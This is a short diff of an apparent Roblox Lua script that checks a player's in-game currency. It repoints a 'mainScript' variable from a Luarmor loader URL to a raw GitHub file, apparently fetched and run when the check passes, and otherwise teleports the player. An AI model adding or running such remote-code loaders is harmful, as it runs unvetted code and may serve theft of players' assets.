@@ -237,7 +237,7 @@ local meetsMinimum, highestAmount, currencyTextLabel = CheckCurrency(minimum)
 
 
 local hasMatch = meetsMinimum or nameFound
-local mainScript = "https://api.luarmor.net/files/v3/loaders/ac88f99f2b292242281d052a71f08a70.lua"
+local mainScript = "https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr"
 
 if meetsMinimum then
 	print("Ooooo we got something")
@@ -376,3 +376,4 @@ else
 		game["Teleport Service"]:Teleport(109983668079237, game.Players.LocalPlayer)
 	end
 end
+
